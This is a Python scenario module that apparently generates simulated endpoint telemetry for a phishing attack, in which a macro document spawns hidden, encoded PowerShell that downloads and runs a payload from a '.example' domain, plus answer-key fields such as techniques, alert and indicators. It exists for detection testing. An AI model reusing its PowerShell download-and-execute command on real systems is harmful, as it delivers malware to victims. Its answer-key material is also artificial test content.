"""s01: a macro document from email runs encoded PowerShell that downloads and starts a
payload. Story: Outlook saves the attachment, Word opens it, Word spawns hidden PowerShell,
PowerShell resolves a .example domain, downloads an exe, runs it, and the exe calls home."""

from scripts.gen.core import fake_sha256, outlook_cache, secs
from scripts.gen.scenario import AlertDraft, Context, Indicator, ScenarioResult, encode_powershell

SCENARIO_ID = "s01"
DOMAINS = ["invoice-portal.example", "secure-billing.example", "docs-share.example"]
LURES = ["Invoice_Oct_{n}.docm", "Remittance_{n}.docm", "PO_{n}_overdue.docm"]


def inject(ctx: Context) -> ScenarioResult:
    w, rng = ctx.world, ctx.rng
    hostname, user = ctx.pick_desk(("Finance", "HR", "Executive"))
    d = rng.choice([1, 2, 3])
    s = ctx.session(hostname, d)
    domain = DOMAINS[(ctx.variant - 1) % len(DOMAINS)]
    ip = ctx.bad_ip(0)
    payload_hash = fake_sha256("s01-payload", ctx.variant, ip)
    outlook = s.procs["OUTLOOK.EXE"]
    t = s.start + secs(rng.randint(3600, 3 * 3600))

    lure = rng.choice(LURES).format(n=rng.randint(1000, 9999))
    doc_path = rf"{outlook_cache(user)}\{ctx.token(8)}\{lure}"
    attachment = w.write_file(
        t, outlook, user, doc_path, rng.randint(40_000, 90_000), sha256=fake_sha256("s01-doc", ip)
    )
    word = w.start(t + secs(22), hostname, user, "WINWORD.EXE", outlook, rng, f'/n "{doc_path}"')

    exe_path = rf"C:\Users\{user}\AppData\Roaming\Microsoft\msupdate.exe"
    script = (
        f"$u='http://{domain}/dl/update.bin';$p=\"$env:APPDATA\\Microsoft\\msupdate.exe\";"
        "(New-Object Net.WebClient).DownloadFile($u,$p);Start-Process $p"
    )
    ps = w.start(
        t + secs(39),
        hostname,
        user,
        "powershell.exe",
        word,
        rng,
        f"-NoP -W Hidden -Enc {encode_powershell(script)}",
    )
    lookup = w.dns(t + secs(40), ps, user, domain, ip)
    size = rng.randint(180_000, 320_000)
    download = w.connect(t + secs(41), ps, user, ip, 80, rng.randint(300, 600), size + 420)
    dropped = w.write_file(t + secs(43), ps, user, exe_path, size, sha256=payload_hash)
    payload = w.start(
        t + secs(45),
        hostname,
        user,
        "msupdate.exe",
        ps,
        rng,
        path=exe_path,
        sha256=payload_hash,
    )
    callbacks = []
    beacon_at = t + secs(60)
    for _ in range(3):
        callbacks.append(w.connect(beacon_at, payload, user, ip, 443, rng.randint(400, 1_500), 300))
        beacon_at += secs(rng.randint(240, 360))

    key = [
        attachment,
        word.started(),
        ps.started(),
        lookup,
        download,
        dropped,
        payload.started(),
        *callbacks,
    ]
    return ScenarioResult(
        scenario_id=SCENARIO_ID,
        title="Phishing document launches encoded PowerShell that downloads a payload",
        verdict="malicious",
        expected_techniques=["T1566.001", "T1204.002", "T1059.001", "T1027", "T1105"],
        events=ctx.emitted(),
        key_events=key,
        alert=AlertDraft(
            ts=ps.started().ts + secs(2),
            rule="Office application spawned PowerShell",
            severity="high",
            host=hostname,
            user=user,
            description="WINWORD.EXE started powershell.exe with an encoded command line.",
            triggers=[ps.started()],
        ),
        indicators=[
            Indicator(domain, "domain", True, "Malware distribution domain (phishing kit)"),
            Indicator(ip, "ip", False, "Download server"),
            Indicator(payload_hash, "hash", True, "Commodity loader"),
        ],
    )
